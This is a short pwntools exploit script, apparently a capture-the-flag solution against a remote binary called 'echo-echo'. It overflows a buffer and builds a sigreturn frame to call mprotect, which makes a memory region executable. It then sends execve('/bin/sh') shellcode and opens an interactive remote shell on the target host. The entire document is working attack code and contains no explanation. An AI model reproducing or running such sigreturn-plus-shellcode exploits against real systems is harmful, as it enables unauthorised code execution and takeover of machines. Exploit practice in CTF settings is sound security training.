from pwn import *

p = remote('147.182.172.200', 9002)
# p = process('./echo-echo')
context.clear(arch='amd64')
context.log_level = 'debug'

syscall_ret = 0x40009b
read = 0x400091
writable = 0x400000
new_ret = 0x400018 # Program Entrypoint

payload = b'A'*8
payload += p64(read)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0x400018
frame.rip = 0x40009b

payload += bytes(frame)

# sending
# gdb.attach(p, '''b*0x40009b''')
p.send(payload)
sleep(1)
payload = 'B'*0xf # sigret
p.send(payload)

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = b""
shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96"
shellcode += b"\x91\xd0\x8c\x97\xff\x48\xf7"
shellcode += b"\xdb\x53\x54\x5f\x99\x52\x57"
shellcode += b"\x54\x5e\xb0\x3b\x0f\x05"

payload = b'A'*8
payload += p64(new_ret+8)
payload += shellcode
sleep(1)
p.send(payload)
p.interactive()